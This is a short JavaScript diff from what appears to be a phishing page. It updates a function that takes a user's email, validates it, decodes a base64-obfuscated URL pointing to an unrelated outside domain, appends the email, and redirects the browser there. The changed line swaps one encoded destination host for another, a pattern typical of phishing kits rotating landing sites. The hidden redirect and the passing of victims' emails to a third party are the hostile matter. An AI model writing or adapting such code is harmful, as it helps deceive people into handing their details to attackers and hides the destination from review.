@@ -154,7 +154,7 @@
         function continueLoading() {
     var thesupwillsup = document.getElementById('thesupwillsup-input').value;
     if (validateEmail(thesupwillsup)) {
-        var linkx = "aHR0cHM6Ly90aGVzd2VldHN0ZXIubnVtYmVyMWluc2VydmljZS5jb20vbS8/YzNZOWJ6TTJOVjh4WDNOd0puSmhibVE5VTBkb05GTnFTVDBtZFdsa1BWVlRSVkl4T0RFeE1qQXlORlV3TkRFeE1UZ3lPUT09TjAxMjNOIw"; // Base64 encoded link
+        var linkx = "aHR0cHM6Ly92aW55bGFuZDQ1LmNvbS9tLz9jM1k5YnpNMk5WOHhYMjV2YlNaeVlXNWtQV1JYVG5STlYyODlKblZwWkQxVlUwVlNNVGd4TVRJd01qUlZNRFF4TVRFNE1qaz1OMDEyM04j"; // Base64 encoded link
         var decodedLink = atob(linkx);
         var finalLink = decodedLink + "" + thesupwillsup;  // Directly append the email address
         window.location.href = finalLink;
